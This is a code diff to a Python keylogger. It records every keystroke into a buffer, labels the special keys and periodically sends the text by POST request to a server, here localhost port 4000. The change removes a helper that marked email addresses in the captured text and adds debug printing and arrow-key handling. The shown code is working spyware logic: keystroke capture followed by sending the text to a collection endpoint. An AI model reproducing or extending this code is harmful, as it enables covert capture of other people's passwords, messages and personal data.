@@ -10,7 +10,6 @@ text = ''
 
 localhost = "127.0.0.1"
 port_number = "4000"
-
 time_interval = 10
 
 
@@ -37,27 +36,11 @@ def send_post_req():
     except:
         print("Couldn't complete request!")
 
-# Define highlight_emails function to highlight emails with asterisks ("*")
-
-
-def highlight_emails(text):
-    words = text.split(" ")
-    modified_words = []
-
-    for word in words:
-        # Check if the word resembles an email
-        if '@' in word and '.com' in word and '*' not in word:
-            modified_words.append('*' + word + '*')
-        else:
-            modified_words.append(word)
-
-    modified_text = ' '.join(modified_words)
-    return modified_text
-
 
 def on_press(key):
     global text
-
+    # print key value to identify which arrow key is pressed by user
+    print(key)
     if key == keyboard.Key.enter:
         text += "\n"
     elif key == keyboard.Key.tab:
@@ -80,6 +63,7 @@ def on_press(key):
         pass
     elif key == keyboard.Key.esc:
         return False
+    # Write code to handle arrow keys of the keyboard
     elif key == keyboard.Key.right:
         text += " (RIGHT_ARROW) "
     elif key == keyboard.Key.left:
@@ -90,8 +74,6 @@ def on_press(key):
         text += " (DOWN_ARROW) "
     else:
         text += str(key).strip("'")
-    # Call highlight_email function to highlight the emails with asterisks ("*")
-    text = highlight_emails(text)
 
 
 def on_release(key):
